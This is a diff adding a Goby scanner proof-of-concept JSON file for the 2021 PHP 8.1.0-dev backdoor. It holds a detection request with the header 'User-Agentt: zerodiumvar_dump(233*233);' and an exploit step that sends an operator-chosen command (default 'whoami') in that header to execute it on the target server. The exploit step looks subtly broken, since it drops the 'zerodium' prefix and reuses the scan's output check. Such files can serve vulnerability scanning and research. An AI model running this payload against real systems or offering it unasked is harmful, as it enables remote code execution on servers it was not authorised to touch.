@@ -1,0 +1,100 @@
+{
+      "Name": "php8.1backdoor",
+      "Level": "3",
+      "Tags": [
+            "RCE"
+      ],
+      "GobyQuery": "app=php",
+      "Description": "PHP 8.1.0-dev 版本在2021年3月28日被植入后门，但是后门很快被发现并清除。当服务器存在该后门时，攻击者可以通过发送User-Agentt头来执行任意代码。",
+      "Product": "php",
+      "Homepage": "https://gobies.org/",
+      "Author": "k3vi_07@icloud.com",
+      "Impact": "<p><span style=\"color: rgb(36, 41, 46); font-size: 16px;\">PHP 8.1.0-dev 版本在2021年3月28日被植入后门，但是后门很快被发现并清除。当服务器存在该后门时，攻击者可以通过发送</span><span style=\"color: rgb(36, 41, 46); font-size: 16px;\">User-Agentt</span><span style=\"color: rgb(36, 41, 46); font-size: 16px;\">头来执行任意代码。</span><br></p>",
+      "Recommandation": "<p>无</p>",
+      "References": [
+            "https://gobies.org/"
+      ],
+      "HasExp": true,
+        "ExpParams": [
+            {
+                  "name": "cmd",
+                  "type": "input",
+                  "value": "whoami",
+                  "show": ""
+            }
+      ],
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/",
+                        "follow_redirect": true,
+                        "header": {
+                              "User-Agentt": "zerodiumvar_dump(233*233);"
+                        },
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "int(54289)",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+            "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/",
+                        "follow_redirect": true,
+                        "header": {
+                              "User-Agentt": "{{{cmd}}}"
+                        },
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "int(54289)",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "PostTime": "2021-04-01 11:40:29",
+      "GobyVersion": "1.8.255"
+}
